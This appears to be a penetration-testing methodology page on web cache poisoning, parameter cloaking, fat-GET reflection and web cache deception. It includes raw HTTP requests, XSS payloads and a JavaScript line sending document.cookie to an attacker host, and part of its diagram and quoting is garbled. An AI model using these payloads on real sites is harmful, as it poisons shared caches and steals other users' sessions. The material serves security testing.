Cache Poisoning
Cache poisoning and web cache deception are related but different. Poisoning: you poison the cache so other users receive your malicious response. Deception: you trick a user into caching their own private response, then retrieve it. This page covers both  -  they often share the same root cause and infrastructure.

How Cache Keying Works
The cache stores responses keyed on the request. The key is usually host + path + query. Headers are typically not part of the key  -  but they can affect the response. That's the gap.

    E --> F["Response includes evil.com script"]
    F --> G["Response cached"]
    G --> H["All users get poisoned response"]

Unkeyed Headers  -  The Attack Surface
These headers influence response content but are commonly excluded from cache keys:
X-Forwarded-Host
X-Forwarded-For
X-Forwarded-Scheme
X-Host
X-Original-URL
X-Rewrite-URL
X-Forwarded-Port
X-Original-Forwarded-For
Forwarded
Use Param Miner (Burp extension) to discover which headers are unkeyed and reflected: right-click request → Guess headers. It fuzzes hundreds of header names and flags ones that appear in the response.
Practical Poisoning Flow
Step 1: Find an Unkeyed Header That's Reflected
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
 
HTTP/1.1 200 OK
<script src="attacker.com/static/js/app.js">
The response includes attacker.com because the app uses X-Forwarded-Host to construct absolute URLs.
Step 2: Verify It's Not Already Cached (Cache Buster)
Add a cache-busting parameter to test without poisoning real users:
GET /?cb=12345 HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
Check response headers for X-Cache: MISS (first hit, went to backend) vs X-Cache: HIT (served from cache).
Step 3: Poison Without Cache Buster
Once confirmed, send without the cache buster. The malicious response gets cached under the canonical URL. Verify by making a fresh request from a different IP/session and checking if you receive the poisoned response.
Step 4: Host Your Payload
On attacker.com, serve JavaScript at the path the response expects:
// attacker.com/static/js/app.js
document.location = 'attacker.com/steal#039; + document.cookie;
Parameter Cloaking
Caches and backends sometimes parse query strings differently. If the cache uses the first instance of a parameter but the backend uses the last:
GET /search?q=legit&q=<script>alert(1)</script>
Cache key: /search?q=legit
Backend sees: q=<script>alert(1)</script>
The cached key looks clean; the backend processes the malicious value. Param Miner detects this automatically.
Fat GET / Body-Reflected Unkeyed Input
Some backends process POST body parameters even on GET requests. If body content is reflected in a GET response but the cache key is based on the URL only:
GET /page HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
 
x=<script>alert(1)</script>
If reflected and cached, every subsequent GET to /page delivers XSS.
Web Cache Deception
Cache deception is the mirror image of poisoning  -  instead of poisoning what the cache serves, you trick a victim into caching their own private data, then retrieve it. This attack class has its own dedicated page with full methodology, CDN-specific behaviors, and path confusion techniques:
See Web Cache Deception for the complete guide.
Checklist

 Run Param Miner on the target  -  identify unkeyed headers
 Test each unkeyed header for reflection in response
 Use cache-buster param while probing to avoid unintended poisoning
 Check cache response headers: X-Cache, CF-Cache-Status, Age, Surrogate-Key
 Test parameter cloaking  -  duplicate parameters with different values
 Test fat GET / body reflection
 Test web cache deception: authenticated URL + appended .css/.js/.png extension
 Document cache TTL  -  how long does the poisoned response persist?
